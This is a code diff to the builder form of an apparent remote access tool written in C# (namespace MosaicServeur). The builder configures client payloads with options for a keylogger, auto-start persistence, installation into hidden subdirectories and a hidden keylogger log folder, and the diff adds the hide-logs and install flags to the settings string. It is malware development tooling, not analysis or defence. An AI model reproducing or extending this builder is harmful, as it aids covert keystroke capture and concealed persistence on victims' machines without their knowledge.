@@ -14,7 +14,6 @@ namespace MosaicServeur
         private FrmBuilderController buildercontroller = new FrmBuilderController();
         private int PORT = 0;
         private int RECONNECT = 0;
-        private int installPATH;
 
 
         public Builder()
@@ -25,7 +24,7 @@ namespace MosaicServeur
 
         private void Load(object sender, RoutedEventArgs e)
         {
-            GridCursor.Margin = new Thickness(0 + (150 * 0), 20, 0, 0);
+            GridCursor.Margin = new Thickness(0 + (110 *0), 20, 0, 0);
             tcSample.SelectedIndex = 0;
             var i = (ClientsListView.connectedClients() + 1).ToString();
             txtClientID.Text = string.Format("Client {0}", int.Parse(i) < 10 && int.Parse(i) > 0 ? "0" + i : i);
@@ -38,6 +37,7 @@ namespace MosaicServeur
             txtStartupName.Text = "";
             txtSubDirI.Text = "";
             txtFileNameI.Text = "";
+            txtLogDir.Text = "";
             radioGroup.IsEnabled = false;
             spSubDirectory.IsEnabled = false;
             spFileName.IsEnabled = false;
@@ -45,16 +45,18 @@ namespace MosaicServeur
             radio1.IsChecked = true;
             chkHideSubDirI.IsChecked = false;
             chkHideFileI.IsChecked = false;
+            chkHideLogsDir.IsChecked = false;
             lblDirectory.Foreground = new SolidColorBrush(Colors.LightGray);
             lblSubDirectory.Foreground = new SolidColorBrush(Colors.LightGray);
             lblFileName.Foreground = new SolidColorBrush(Colors.LightGray);
+            lblStartupName.Foreground = new SolidColorBrush(Colors.LightGray);
         }
 
         private void btnTabControl(object sender, RoutedEventArgs e)
         {
             int index = int.Parse(((Button)e.Source).Uid);
 
-            GridCursor.Margin = new Thickness(0 + (150 * index), 20, 0, 0);
+            GridCursor.Margin = new Thickness(0 + (110 * index), 20, 0, 0);
 
             switch (index)
             {
@@ -100,11 +102,12 @@ namespace MosaicServeur
         private string getChkValues()
         {
             string trueOrFalse = "";
-            trueOrFalse += chkKeyLogger.IsChecked   == true ? "1" : "0";
-            trueOrFalse += chkAutoStart.IsChecked   == true ? "1" : "0";
-            trueOrFalse += chkHideSubDirI.IsChecked == true ? "1" : "0";
-            trueOrFalse += chkHideFileI.IsChecked   == true ? "1" : "0";
-            trueOrFalse += chkHideLogsDir.IsChecked == true ? "1" : "0";
+            trueOrFalse += chkKeyLogger.IsChecked   == true ? "1" : "0"; // KEYLOGGER
+            trueOrFalse += chkHideLogsDir.IsChecked == true ? "1" : "0"; // KEYLOGGER
+            trueOrFalse += chkAutoStart.IsChecked   == true ? "1" : "0"; // AutoStartup
+            trueOrFalse += chkInstall.IsChecked     == true ? "1" : "0"; // INSTALL
+            trueOrFalse += chkHideSubDirI.IsChecked == true ? "1" : "0"; // INSTALL
+            trueOrFalse += chkHideFileI.IsChecked   == true ? "1" : "0"; // INSTALL
             return trueOrFalse;
         }
 
